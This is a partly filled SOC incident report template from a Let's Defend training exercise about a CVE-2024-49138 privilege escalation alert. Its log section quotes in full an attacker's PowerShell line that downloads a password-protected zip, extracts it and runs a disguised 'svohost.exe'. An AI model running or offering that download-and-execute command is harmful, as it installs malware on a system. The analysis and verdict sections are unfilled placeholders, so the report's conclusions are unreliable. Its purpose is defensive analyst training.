# 📄 SOC Incident Report

## 📌 General Information

- **Platform:** Let's Defend
- **Analyst:** Juan J. Donado A.
- **Event ID:** 313
- **Type:** Privilege Escalation
- **Date:** Jan, 22, 2025, 02:37 AM
- **Rule Name**: SOC335 - CVE-2024-49138 Exploitation Detected
- **Severity:** Medium
- **Level**: Security Analyst
- **Destination Address:** 172.16.17.207
- **Hostname:** Victor
- **Source Address:** 185.107.56.141
- **Process Name:** svohost.exe
- **Process Path:** "C:\temp\service_installer\svohost.exe"
- **Process ID:** 7640
- **Parent Process:** 185.107.56.141C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe
- **Command Line:** \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- **File Hash:** b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9
- **Process User:** EC2AMAZ-ILGVOIN\LetsDefend
- **Device Action:** Allowed

## 🚨 Alert Description

Unusual or suspicious patterns of behavior linked to the hash have been identified, indicating potential exploitation of CVE-2024-49138.

# 🔎 Investigation Process

Step by step, like a real SOC.
1. Alert Validation
2. Log review
3. IP Reputation check
4. User behavior analysis

# 📂 Logs & Evidence

Username: admin
EventID: 4625(An account failed to log on)
Error Code: 0xC000006D(Unknown user name or bad password)
Source IP: 185.107.56.141

Username: Victor
EventID: 4624(An account was successfully logged on.)
Logon Type: 10(RemoteInteractive)
Source IP: 185.107.56.141

**CommandLine:** $url = 'https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip'; $dest = 'C:\temp\service-installer.zip'; $extractPath = 'C:\temp'; $password = 'infected'; if (-not (Test-Path -Path $extractPath)) { New-Item -ItemType Directory -Path $extractPath -Force | Out-Null }; Invoke-WebRequest -Uri $url -OutFile $dest; $7zipPath = 'C:\Program Files\7-Zip\7z.exe'; Start-Process -FilePath $7zipPath -ArgumentList "x -p$password -o$extractPath $dest" -NoNewWindow -Wait -PassThru; Remove-Item -Path $dest; Start-Process -FilePath "$extractPath\service_installer\svohost.exe"



| Source    | Key Evidence               |
| --------- | -------------------------- |
| Auth Logs | Multiple failures + Sucess |
| Firewall  | Ip not previously seen     |
| endpoint  | No malware detected        |

# 🧠 Analysis

Was this a true positive or false positive
Why?
Any correlation with other alerts?

# ⚙️ Enrichment

- **IP reputation:**
- **GeoIP:**
- **VirusTotal:**
- **Threat Intel feeds:**

# 🌐 MITRE ATT&CK Mapping

| Tactic            | Technique |
| ----------------- | --------- |
| Credential Access | T1110     |
| Initial Access    | T1078     |

# ❗ Impact Assessment

- **User impacted:**
- **Systems affected:**
- **Data exposure risk:**

# 🔧 Response Actions

- Account reset
- IP blocked
- Ticket escalated
- monitoring enabled

# ✔️ Final Veredict

- **Incident Type:** (Brute Force / Phishing / Benign)
- **Status:** Closed / Escalated
- **Confidence Level:** High / Medium

# 🛡️ Recommendation

- Improve detection rule
- Enable MFA
- Adjust alert thresholds

# 📝 Lessons Learned

What to improve as a SOC.

